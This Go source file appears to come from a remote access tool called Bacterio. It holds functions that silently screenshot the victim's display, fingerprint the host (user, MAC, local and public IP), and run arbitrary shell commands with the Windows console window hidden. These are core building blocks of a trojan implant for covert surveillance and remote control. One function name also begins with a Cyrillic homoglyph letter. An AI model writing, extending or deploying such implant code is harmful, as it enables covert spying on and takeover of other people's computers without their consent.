package system

import (
	"bufio"
	"bytes"
	"context"
	"fmt"
	"image/png"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"syscall"
	"time"

	"github.com/fr13n8/Bacterio/internal/models"
	"github.com/fr13n8/Bacterio/pkg/network"
	"github.com/kbinani/screenshot"
)

func TakeScreenshot() ([]byte, error) {
	display, err := screenshot.CaptureDisplay(0)
	if err != nil {
		return nil, err
	}

	var body bytes.Buffer
	writer := bufio.NewWriter(&body)
	if err := png.Encode(writer, display); err != nil {
		return nil, err
	}

	return body.Bytes(), nil
}

func GetInfoAboutDevice() *models.Connect {
	hostname, _ := os.Hostname()
	username, _ := user.Current()
	macAddr, _ := network.GetMacAddress()
	return &models.Connect{
		Hostname:        hostname,
		Username:        username.Name,
		UserID:          username.Username,
		OSName:          runtime.GOOS,
		MacAddress:      macAddr,
		LocalIPAddress:  network.GetLocalIP().String(),
		PublicIpAddress: network.GetPublicIpAddress(),
		FetchedUnix:     time.Now().UnixNano(),
	}
}

func GetHideWindowParam() *syscall.SysProcAttr {
	return &syscall.SysProcAttr{HideWindow: true}
}

func RunCmd(cmd string, timeout time.Duration) ([]byte, error) {
	ctx, cancel := context.WithTimeout(context.Background(), timeout*time.Second)
	defer cancel()

	osType := DetectOS()
	var cmdExec *exec.Cmd
	switch osType {
	case Windows:
		cmdExec = exec.CommandContext(ctx, "cmd", "/C", cmd)
		cmdExec.SysProcAttr = GetHideWindowParam()
	case Linux:
		cmdExec = exec.CommandContext(ctx, "sh", "-c", cmd)
	case Darwin:
		cmdExec = exec.CommandContext(ctx, "sh", "-c", cmd)
	default:
		return nil, fmt.Errorf("os not supported")
	}

	c, err := cmdExec.CombinedOutput()
	if err != nil {
		if ctx.Err() != nil {
			return nil, fmt.Errorf("command deadline exceeded")
		}
		return nil, err
	}
	return c, nil
}

func СheckFileExist(filePath string) bool {
	if _, err := os.Stat(filePath); os.IsNotExist(err) {
		return false
	} else {
		return true
	}
}

func CreateDirectory(path string) {
	if _, err := os.Stat(path); os.IsNotExist(err) {
		os.MkdirAll(path, os.ModePerm)
	}
}
